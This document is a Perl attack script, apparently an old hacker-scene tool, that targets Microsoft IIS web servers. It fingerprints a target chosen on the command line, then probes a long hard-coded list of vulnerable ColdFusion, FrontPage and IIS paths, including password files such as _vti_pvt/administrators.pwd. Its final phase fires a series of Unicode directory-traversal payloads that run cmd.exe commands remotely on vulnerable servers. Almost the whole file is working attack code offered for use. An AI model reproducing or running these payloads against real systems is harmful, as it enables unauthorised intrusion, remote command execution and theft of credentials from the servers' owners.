#!/usr/bin/perl
# ncode@synnergy.net
# Only written for personal use, feel free to use the rights of GPL!
#
# The cgi part was originaly made by Azrael, i think. Cheers!

use IO::Socket;


$host=$ARGV[0];
$port=$ARGV[1];

if($host eq "") { 
	print "Have to specify host - Uchmando\n";
	print "./iischeck host [port] [-v]\n";
	dienice;
	}
	else {
if($ARGV[1] eq "") { $port=80; }


if(!gethostbyname($host)) { print "$host does not seem to be up - Uchmando\n"; }
else {

# This is were the the CGI list defines, feel free to grab CGI's for own studys!
%exploits = (   

# ColdFusion vulnerabilities
# check http://www.notrace.org/cgi-bin/cgi.pl?coldfusion for info.
"/cfdocs/zero.cfm" => "/cfdocs/zero.cfm",
"/cfdocs/root.cfm" => "/cfdocs/root.cfm",
"/cfdocs/expressions.cfm" => "/cfdocs/expressions.cfm",
"/cfdocs/TOXIC.CFM" => "/cfdocs/TOXIC.CFM",
"/cfdocs/MOLE.CFM" => "/cfdocs/MOLE.CFM",
"/cfdocs/expeval/exprcalc.cfm" => "/cfdocs/expeval/exprcalc.cfm",
"/cfdocs/expeval/sendmail.cfm" => "/cfdocs/expeval/sendmail.cfm",
"/cfdocs/expeval/eval.cfm" => "/cfdocs/expeval/eval.cfm",
"/cfdocs/expeval/openfile.cfm" => "/cfdocs/expeval/openfile.cfm",
"/cfdocs/expeval/displayopenedfile.cfm" => "/cfdocs/expeval/displayopenedfile.cfm",
"/cfdocs/exampleapp/publish/admin/addcontent.cfm" => "/cfdocs/exampleapp/publish/admin/addcontent.cfm",
"/cfdocs/exampleapp/email/getfile.cfm?filename=c:\boot.ini" => "/cfdocs/exampleapp/email/getfile.cfm?filename=c:\boot.ini",
"/cfdocs/exampleapp/publish/admin/application.cfm" => "/cfdocs/exampleapp/publish/admin/application.cfm",
"/cfdocs/exampleapp/email/application.cfm" => "/cfdocs/exampleapp/email/application.cfm",
"/cfdocs/exampleapp/docs/sourcewindow.cfm" => "/cfdocs/exampleapp/docs/sourcewindow.cfm",
"/cfdocs/examples/parks/detail.cfm" => "/cfdocs/examples/parks/detail.cfm",
"/cfdocs/examples/cvbeans/beaninfo.cfm" => "/cfdocs/examples/cvbeans/beaninfo.cfm",
"/cfdocs/cfmlsyntaxcheck.cfm" => "/cfdocs/cfmlsyntaxcheck.cfm",
"/cfdocs/snippets/viewexample.cfm" => "/cfdocs/snippets/viewexample.cfm",
"/cfdocs/snippets/gettempdirectory.cfm" => "/cfdocs/snippets/gettempdirectory.cfm",
"/cfdocs/snippets/fileexists.cfm" => "/cfdocs/snippets/fileexists.cfm",
"/cfdocs/snippets/evaluate.cfm" => "/cfdocs/snippets/evaluate.cfm",
"/cfappman/index.cfm" => "/cfappman/index.cfm",
"/cfusion/cfapps/forums/forums_.mdb" => "/cfusion/cfapps/forums/forums_.mdb",
"/cfusion/cfapps/security/realm_.mdb" => "/cfusion/cfapps/security/realm_.mdb",
"/cfusion/cfapps/forums/data/forums.mdb" => "/cfusion/cfapps/forums/data/forums.mdb",
"/cfusion/cfapps/security/data/realm.mdb" => "/cfusion/cfapps/security/data/realm.mdb",
"/cfusion/database/cfexamples.mdb" => "/cfusion/database/cfexamples.mdb",
"/cfusion/database/cfsnippets.mdb" => "/cfusion/database/cfsnippets.mdb",
"/cfusion/database/smpolicy.mdb" => "/cfusion/database/smpolicy.mdb",
"/cfusion/database/cypress.mdb" => "/cfusion/database/cypress.mdb",

# Windows NT vulnerabilities
# check http://www.notrace.org/cgi-bin/cgi.pl?winnt for info.
"/Scripts" => "/Scripts",
"/Default.asp" => "/Default.asp",
"/_vti_bin" => "/_vti_bin",
"/_vti_bin/_vti_adm" => "/_vti_bin/_vti_adm",
"/_vti_bin/_vti_aut" => "/_vti_bin/_vti_aut",
"/cgi-bin/" => "/cgi-bin/",
"/srchadm" => "/srchadm",
"/iisadmin" => "/iisadmin",
"/_AuthChangeUrl?" => "/_AuthChangeUrl?",
"/_vti_inf.html" => "/_vti_inf.html",
"/?PageServices" => "/?PageServices",
"/html/?PageServices" => "/html/?PageServices",

# Frontpage 98 database vulnerabilities
# check http://www.notrace.org/cgi-bin/cgi.pl?frontpage98 for info.
"/scripts/cpshost.dll" => "/scripts/cpshost.dll",
"/scripts/uploadn.asp" => "/scripts/uploadn.asp",
"/scripts/uploadx.asp" => "/scripts/uploadx.asp",
"/scripts/upload.asp" => "/scripts/upload.asp",
"/scripts/repost.asp" => "/scripts/repost.asp",
"/scripts/postinfo.asp" => "/scripts/postinfo.asp",
"/scripts/run.exe" => "/scripts/run.exe",

# Frontpage 98 inetpub + nt4 server vulnerabilities
# check http://www.notrace.org/cgi-bin/cgi.pl?frontpage98 for info.
"/scripts/iisadmin/bdir.htr" => "/scripts/iisadmin/bdir.htr",
"/scripts/iisadmin/samples/" => "/scripts/iisadmin/samples/",
"/scripts/iisadmin/samples/ctgestb.htx" => "/scripts/iisadmin/samples/ctgestb.htx",
"/scripts/iisadmin/samples/ctgestb.idc" => "/scripts/iisadmin/samples/ctgestb.idc",
"/scripts/iisadmin/samples/details.htx" => "/scripts/iisadmin/samples/details.htx",
"/scripts/iisadmin/samples/details.idc" => "/scripts/iisadmin/samples/details.idc",
"/scripts/iisadmin/samples/query.htx" => "/scripts/iisadmin/samples/query.htx",
"/scripts/iisadmin/samples/query.idc" => "/scripts/iisadmin/samples/query.idc",
"/scripts/iisadmin/samples/register.htx" => "/scripts/iisadmin/samples/register.htx",
"/scripts/iisadmin/samples/register.idc" => "/scripts/iisadmin/samples/register.idc",  
"/scripts/iisadmin/samples/sample.htx" => "/scripts/iisadmin/samples/sample.htx",
"/scripts/iisadmin/samples/sample.idc" => "/scripts/iisadmin/samples/sample.idc",
"/scripts/iisadmin/samples/sample2.htx" => "/scripts/iisadmin/samples/sample2.htx",
"/scripts/iisadmin/samples/sample3.idc" => "/scripts/iisadmin/samples/sample3.idc",
"/scripts/iisadmin/samples/viewbook.htx" => "/scripts/iisadmin/samples/viewbook.htx",
"/scripts/iisadmin/samples/viewbook.idc" => "/scripts/iisadmin/samples/viewbook.idc",
"/scripts/iisadmin/tools/ct.htx" => "/scripts/iisadmin/tools/ct.htx",
"/scripts/iisadmin/tools/ctss.idc" => "/scripts/iisadmin/tools/ctss.idc",
"/scripts/iisadmin/tools/dsnform.exe" => "/scripts/iisadmin/tools/dsnform.exe",
"/scripts/iisadmin/tools/getdrvrs.exe" => "/scripts/iisadmin/tools/getdrvrs.exe",
"/scripts/iisadmin/tools/mkilog.exe" => "/scripts/iisadmin/tools/mkilog.exe",
"/scripts/iisadmin/tools/newdsn.exe" => "/scripts/iisadmin/tools/newdsn.exe",

# IIS 4 vulnerabilities
# check http://www.notrace.org/cgi-bin/cgi.pl?iis4 for info.
"/IISADMPWD/achg.htr" => "/IISADMPWD/achg.htr",
"/IISADMPWD/aexp.htr" => "/IISADMPWD/aexp.htr",
"/IISADMPWD/aexp2.htr" => "/IISADMPWD/aexp2.htr",
"/IISADMPWD/aexp2b.htr" => "/IISADMPWD/aexp2b.htr",
"/IISADMPWD/aexp3.htr" => "/IISADMPWD/aexp3.htr",
"/IISADMPWD/aexp4.htr" => "/IISADMPWD/aexp4.htr",
"/IISADMPWD/aexp4b.htr" => "/IISADMPWD/aexp4b.htr",
"/IISADMPWD/anot.htr" => "/IISADMPWD/anot.htr",
"/IISADMPWD/anot3.htr" => "/IISADMPWD/anot3.htr",
"/_vti_pvt/writeto.cnf" => "/_vti_pvt/writeto.cnf",
"/_vti_pvt/svcacl.cnf" => "/_vti_pvt/svcacl.cnf",
"/_vti_pvt/services.cnf" => "/_vti_pvt/services.cnf",
"/_vti_pvt/service.stp" => "/_vti_pvt/service.stp",
"/_vti_pvt/service.cnf" => "/_vti_pvt/service.cnf",
"/_vti_pvt/access.cnf" => "/_vti_pvt/access.cnf",
"/_vti_pvt/." => "/_vti_pvt/.",
"/_private/registrations.txt" => "/_private/registrations.txt",
"/_private/registrations.htm" => "/_private/registrations.htm",
"/_private/register.txt" => "/_private/register.txt",
"/_private/register.htm" => "/_private/register.htm",
"/_private/orders.txt" => "/_private/orders.txt",
"/_private/orders.htm" => "/_private/orders.htm",
"/_private/form_results.htm" => "/_private/form_results.htm",
"/_private/form_results.txt" => "/_private/form_results.txt",
"/_vti_pvt/service.pwd" => "/_vti_pvt/service.pwd",
"/_\vti_pvt/administrators.pwd" => "/_\vti_pvt/administrators.pwd",
"/_vti_pvt/authors.pwd" => "/_vti_pvt/authors.pwd",
"/_vti_pvt/users.pwd" => "/_vti_pvt/users.pwd",

# IISAPI & misc vulnerabilities
# check http://www.notrace.org/cgi-bin/cgi.pl?iisapi for info.
"/admisapi/fpadmin.htm" => "/admisapi/fpadmin.htm",
"/scripts/Fpadmcgi.exe" => "/scripts/Fpadmcgi.exe",
"/_vti_bin/shtml.dll" => "/_vti_bin/shtml.dll",
"/_vti_bin/shtml.exe" => "/_vti_bin/shtml.exe",
"/_vti_bin/_vti_aut/author.dll" => "/_vti_bin/_vti_aut/author.dll",
"/_vti_bin/_vti_adm/admin.dll" => "/_vti_bin/_vti_adm/admin.dll",
"/msads/Samples/selector/showcode.asp" => "/msads/Samples/selector/showcode.asp",
"/scripts/perl?" => "/scripts/perl?",
"/scripts/proxy/w3proxy.dll" => "/scripts/proxy/w3proxy.dll",
"/iissamples/sdk/asp/docs/codebrws.asp" => "/iissamples/sdk/asp/docs/codebrws.asp",
"/iissamples/exair/howitworks/codebrws.asp" => "/iissamples/exair/howitworks/codebrws.asp",
"/scripts/CGImail.exe" => "/scripts/CGImail.exe",
"/AdvWorks/equipment/catalog_type.asp" => "/AdvWorks/equipment/catalog_type.asp",
"/scripts/iisadmin/default.htm" => "/scripts/iisadmin/default.htm",
"/msadc/samples/adctest.asp" => "/msadc/samples/adctest.asp",
"/adsamples/config/site.csc" => "/adsamples/config/site.csc",
"/scripts/../../cmd.exe" => "/scripts/../../cmd.exe",
"/scripts/cpshost.dll" => "/scripts/cpshost.dll",
"/scripts/convert.bas" => "/scripts/convert.bas",
"8814/iisadmin/iisnew.asp" => "8814/iisadmin/iisnew.asp",
".html/......" => ".html/......",
"/..../Windows/Admin.pwl" => "/..../Windows/Admin.pwl",
"/publisher/" => "/publisher/" );
                
               
&menu();

sub menu() {

{ &exploitnouselist() }

sub exploitnouselist() {
      &cgiscannerloop("$host");
#      &menu();


sub cgiscannerloop() {
system("clear");
print "Starting phase 1, identifying the httpd version... - Uchmando\n";
$host = inet_aton($host);
        $ServerAddr = sockaddr_in($port, $host);
        $protocol_name = "tcp";
        socket(CLIENT, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
        if(connect(CLIENT, $ServerAddr)) {
                send(CLIENT,"HEAD / HTTP/1.0\n\n",0);
                recv(CLIENT, $banner, 10000, undef);
                close(CLIENT); 
                print "$banner";
        }
        else {
	print "\nCant connect to $host:$port - Uchmando\n";
	exit;
	}
	
print "Starting phase 2, checking for vulnerable CGI's - Uchmando\n";
$host = "@_";
$serverIP = inet_aton($host);
$serverAddr = sockaddr_in($port, $serverIP);
$number = 0;

foreach $key (keys %exploits) {

socket(CLIENT, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
if(connect(CLIENT, $serverAddr)) {
send(CLIENT,"HEAD%00 $exploits{$key} HTTP/1.0\n\n",0);
        $check=<CLIENT>;
        ($http,$code,$therest) = split(/ /,$check);
        if($code == 200) {
        print "Found: $key - Uchmando\n";
        $number++;
	}
else { if($ARGV[2] eq "-v") { print "Not Found: $key - Uchmando\n"; } }
}
close (CLIENT);

}
}
if($number == 0) { print "Sigh, couldn´t find a single vulnerable CGI. - Uchmando\n"; }
&apa();
#}
#        }

# This is just pure cut´n´paste from a scanner called "uni2.pl" written by Stealthmode316
# but modified by Roeland
sub apa() {
print "\nFinal phase, trying remote buffer overflows... - Uchmando\n";

$target = inet_aton($host);
$flag=0;

my @results=sendraw("GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir HTTP/1.0\r\n\r\n");
foreach $line (@results){
 if ($line =~ /Directory/) {$flag=1;print "$host/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir\n";}}
my @results=sendraw("GET /scripts..%c1%9c../winnt/system32/cmd.exe?/c+dir HTTP/1.0\r\n\r\n");
foreach $line (@results){
 if ($line =~ /Directory/) {$flag=1;print "$host/scripts..%c1%9c../winnt/system32/cmd.exe?/c+dir\n";}}
my @results=sendraw("GET /scripts/..%c1%pc../winnt/system32/cmd.exe?/c+dir HTTP/1.0\r\n\r\n");
foreach $line (@results){
 if ($line =~ /Directory/) {$flag=1;print "$host/scripts/..%c1%pc../winnt/system32/cmd.exe?/c+dir\n";}}
my @results=sendraw("GET /scripts/..%c0%9v../winnt/system32/cmd.exe?/c+dir HTTP/1.0\r\n\r\n");
foreach $line (@results){
 if ($line =~ /Directory/) {$flag=1;print "$host/scripts/..%c0%9v../winnt/system32/cmd.exe?/c+dir\n";}}
my @results=sendraw("GET /scripts/..%c0%qf../winnt/system32/cmd.exe?/c+dir HTTP/1.0\r\n\r\n");
foreach $line (@results){
 if ($line =~ /Directory/) {$flag=1;print "$host/scripts/..%c0%qf../winnt/system32/cmd.exe?/c+dir\n";}}
my @results=sendraw("GET /scripts/..%c1%8s../winnt/system32/cmd.exe?/c+dir HTTP/1.0\r\n\r\n");
foreach $line (@results){
 if ($line =~ /Directory/) {$flag=1;print "$host/scripts/..%c1%8s../winnt/system32/cmd.exe?/c+dir\n";}}
my @results=sendraw("GET /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir HTTP/1.0\r\n\r\n");
foreach $line (@results){
 if ($line =~ /Directory/) {$flag=1;print "$host/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir\n";}}
my @results=sendraw("GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir HTTP/1.0\r\n\r\n");
foreach $line (@results){
 if ($line =~ /Directory/) {$flag=1;print "$host/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir\n";}}
my @results=sendraw("GET /scripts/..%c1%af../winnt/system32/cmd.exe?/c+dir HTTP/1.0\r\n\r\n");
foreach $line (@results){
 if ($line =~ /Directory/) {$flag=1;print "$host/scripts/..%c1%af../winnt/system32/cmd.exe?/c+dir\n";}}
my @results=sendraw("GET /scripts/..%e0%80%af../winnt/system32/cmd.exe?/c+dir HTTP/1.0\r\n\r\n");
foreach $line (@results){
 if ($line =~ /Directory/) {$flag=1;print "$host/scripts/..%e0%80%af../winnt/system32/cmd.exe?/c+dir\n";}}
my @results=sendraw("GET /scripts/..%f0%80%80%af../winnt/system32/cmd.exe?/c+dir HTTP/1.0\r\n\r\n");
foreach $line (@results){
 if ($line =~ /Directory/) {$flag=1;print "$host/scripts/..%f0%80%80%af../winnt/system32/cmd.exe?/c+dir\n";}}
my @results=sendraw("GET /scripts/..%f8%80%80%80%af../winnt/system32/cmd.exe?/c+dir HTTP/1.0\r\n\r\n");
foreach $line (@results){
 if ($line =~ /Directory/) {$flag=1;print "$host/scripts/..%f8%80%80%80%af../winnt/system32/cmd.exe?/c+dir\n";}}
my @results=sendraw("GET /scripts/..%fc%80%80%80%80%af../winnt/system32/cmd.exe?/c+dir HTTP/1.0\r\n\r\n");
foreach $line (@results){
 if ($line =~ /Directory/) {$flag=1;print "$host/scripts/..%fc%80%80%80%80%af../winnt/system32/cmd.exe?/c+dir\n";}}
my @results=sendraw("GET /msadc/..\%e0\%80\%af../..\%e0\%80\%af../..\%e0\%80\%af../winnt/system32/cmd.exe\?/c\+dir HTTP/1.0\r\n\r\n
");
foreach $line (@results){
 if ($line =~ /Directory/) {$flag=1;print "$host/msadc/..\%e0\%80\%af../..\%e0\%80\%af../..\%e0\%80\%af../winnt/system32/cmd.exe\?/c\+dir\n";}}

if ($flag!=1) {
	print "No remote buffer overflows worked, how about a cookie Uchmando?\n";
	exit;
}

sub sendraw {

	$hbn = gethostbyname($host);

	if ($hbn) {
	        my ($pstr)=@_;
	        socket(S,PF_INET,SOCK_STREAM,gethostbyname('tcp')||0) || die("Socket problems\n");
	
	        if(connect(S,pack "SnA4x8",2,$port,$target)) {
        	        my @in;
               		select(S);      
			$|=1;   
			print $pstr;
                
			while(<S>){ 
				push @in, $_;
			}
                
			select(STDOUT); 
			close(S); 
			return @in;
        	} else {
			print "$host: Can't connect - Uchmando\n";
			exit;
		}
	} else {
		print "$host: Host not found - Uchmando\n";
		exit;
	}
}
}
}
}
}
}
